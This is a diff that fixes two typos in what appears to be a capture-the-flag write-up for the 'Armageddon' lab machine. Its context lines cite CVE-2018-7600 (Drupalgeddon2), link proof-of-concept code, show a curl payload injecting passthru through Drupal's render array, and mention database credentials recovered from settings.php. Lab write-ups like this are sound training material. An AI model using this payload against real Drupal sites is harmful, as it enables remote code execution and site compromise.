@@ -48,7 +48,7 @@ PORT   STATE SERVICE VERSION
 
 * [CVE-2018-7600/SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
   * A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.
-* [gotmilk gist of diffrent drupal drupalgeddon2 PoCs](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708)
+* [gotmilk gist of different drupal drupalgeddon2 PoCs](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708)
 
 ```bash
 id=$(curl -k -s 'http://armageddon.htb/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=id' \
@@ -81,7 +81,7 @@ Found mysql database password in `settings.php` file
 
 ![](screenshots/db-creds.png)
 
-creds are working but don't have intractive shell
+creds are working but don't have interactive shell
 
 ![](screenshots/mysql-login.png)
 
